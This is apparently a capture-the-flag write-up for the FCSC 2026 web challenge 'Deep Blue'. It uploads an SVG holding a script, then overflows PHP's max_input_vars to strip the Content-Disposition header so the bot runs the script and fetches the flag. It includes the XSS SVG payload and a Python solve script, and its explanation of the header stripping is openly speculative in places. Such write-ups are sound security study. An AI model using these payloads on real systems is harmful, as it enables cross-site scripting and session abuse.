# Deep Blue [unintended]

**Category:** Web
**Event:** FCSC 2026

## TL;DR

Upload a malicious SVG (passes mime type check because `image/svg+xml` is allowed). Nginx blocks tab/newline in URLs but doesn't block extra query parameters. Apache's `mod_rewrite` reuses `$request_uri` verbatim (not the normalized URI), so adding 1000+ extra params causes PHP's `max_input_vars` overflow warning before headers are sent, stripping the CSP. Then make the bot visit the SVG served directly (inline, not attachment) triggering the embedded XSS script. The FLAG cookie is httpOnly so we fetch `/api/v1/image?action=read&filename=secret-recipe.txt` which checks the cookie server-side and returns the flag.

## Setup

- Nginx reverse proxy: routes `/api/v1/image` to Apache's `image.php`, everything else passes through to the Angular app
- Apache: serves static Angular SPA + handles PHP
- PHP `image.php`: upload images (mime check), read images

The bot sets a FLAG cookie as `httpOnly` on `deep-blue-nginx`, visits any `http://deep-blue-nginx/` URL you give it.

```javascript
await browser.setCookie({
    name: "FLAG",
    value: process.env.FLAG,
    domain: "deep-blue-nginx",
    httpOnly: true
});
```

Since it's httpOnly, we can't steal it via `document.cookie`. Instead we need to make the bot fetch `secret-recipe.txt` from the PHP backend, which checks the cookie server-side:

```php
if ($filename === 'secret-recipe.txt') {
    if (!isset($_COOKIE['FLAG']) || $_COOKIE['FLAG'] !== getenv('FLAG')) {
        // 403
    } else {
        // return the flag
    }
}
```

The bot already has the cookie. If we can get JS running on the `deep-blue-nginx` origin, we can call `fetch('/api/v1/image?action=read&filename=secret-recipe.txt')` and the browser will automatically include the httpOnly cookie.

## Vulnerability 1 - SVG XSS upload

The upload endpoint checks mime type:

```php
$mimeType = mime_content_type($tmpPath);
if (strpos($mimeType, 'image/') !== 0) { /* reject */ }
```

`image/svg+xml` starts with `image/` so it passes. We can upload an SVG with an embedded `<script>` tag.

The read endpoint serves it with the detected mime type:

```php
header('Content-Type: ' . $mimeType);
readfile($filePath);
```

For SVG files this sends `Content-Type: image/svg+xml`. Browsers execute scripts in SVGs when served with that content type if opened directly (not in an `<img>` tag).

Our SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    fetch('/api/v1/image?action=read&filename=secret-recipe.txt')
      .then(r => r.text())
      .then(t => console.log('FLAG:', t));
  </script>
</svg>
```

If we just ask the bot to visit `http://deep-blue-nginx/api/v1/image?action=read&filename=<our_uuid>.svg`, the file is served with `Content-Disposition: attachment`, which prevents script execution.

## Vulnerability 2 - Stripping CSP/attachment header via query overflow

Wait, there's also the `Content-Disposition: attachment` header that would stop the browser from executing the SVG. We need that header gone.

Looking at the Nginx config:

```nginx
location /api/v1/image {
    proxy_pass http://deep-blue-apache:80/php/image.php;
    ...
}
```

And the key directive:

```nginx
location / {
    rewrite ^(.*)$ $request_uri break;
    proxy_pass http://deep-blue-apache:80;
    ...
}
```

The rewrite uses `$request_uri` (the raw unprocessed URI from the client) rather than `$uri`. This is significant: when Nginx rewrites using `$request_uri`, Apache receives the original raw request URI including all query parameters.

Now the same trick from Shrimp Saver: sending 1000+ query parameters causes PHP to emit a warning before any headers are sent:

```
Warning: PHP Request Startup: Input variables exceeded 1000...
```

Once body output starts, PHP can't send headers. Both `Content-Disposition: attachment` and any other headers are lost. The PHP warnings themselves are output before the file content, but they're plain text so the browser still parses the SVG that follows... except the content type is also now wrong.

Actually when headers can't be sent, the default content type might not be set either. The browser may sniff the content type and see SVG, then execute scripts. Or we need to handle this differently.

The Nginx `blocked_uri` map blocks `%09`, `%0d`, `%0a`, `%0D`, `%0A` to prevent header injection.

The working exploit from the solve script:

```python
print("http://deep-blue-nginx/api/v1/image?action=read&filename=" + filename + "&a" * 1009)
```

Just appending 1009 extra `&a` params to overflow `max_input_vars`. The PHP warning fires before headers, stripping `Content-Disposition` and `Content-Type`. With no explicit content type header, and the response starting with PHP warning text followed by SVG content, the browser sniffs... actually Chrome would fall back to content type sniffing and might recognize `<svg` in the body.

Or more likely: the `max_input_vars` overflow warning is printed first, then PHP tries to set headers (which fail since body already started), then `readfile` outputs the SVG. The browser gets a response with no content-type header (or the default `text/html`). Chrome will likely parse it as HTML and execute the SVG's script block since it's inline in what it treats as an HTML document.

## Exploit flow

1. Upload the XSS SVG to `https://deep-blue.fcsc.fr/api/v1/image?action=upload` - get back the filename (UUID.svg)

2. Give the bot this URL:
   ```
   http://deep-blue-nginx/api/v1/image?action=read&filename=<uuid>.svg&a&a&...x1009
   ```

3. Bot loads the URL. PHP's max_input_vars overflows, warning emitted before headers. The SVG content follows. Browser executes the embedded script with the bot's context (including httpOnly FLAG cookie).

4. The script fetches `/api/v1/image?action=read&filename=secret-recipe.txt`. PHP receives this request with the bot's FLAG cookie, validates it, returns the flag content.

5. The script logs the result - bot console output is sent back to us.

```python
import requests

URL = "https://deep-blue.fcsc.fr/"

s = requests.session()

# Upload XSS SVG
svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
fetch('/api/v1/image?action=read&filename=secret-recipe.txt')
  .then(r=>r.text()).then(t=>console.log('F:',t));
</script></svg>"""

resp = s.post(URL + "api/v1/image?action=upload", files={"image": ("xss.svg", svg, "image/svg+xml")})
filename = resp.json()['filename']

# URL for the bot
bot_url = f"http://deep-blue-nginx/api/v1/image?action=read&filename={filename}" + "&a" * 1009
print(bot_url)
# Send to bot via nc
```

## Flag

`FCSC{...}`
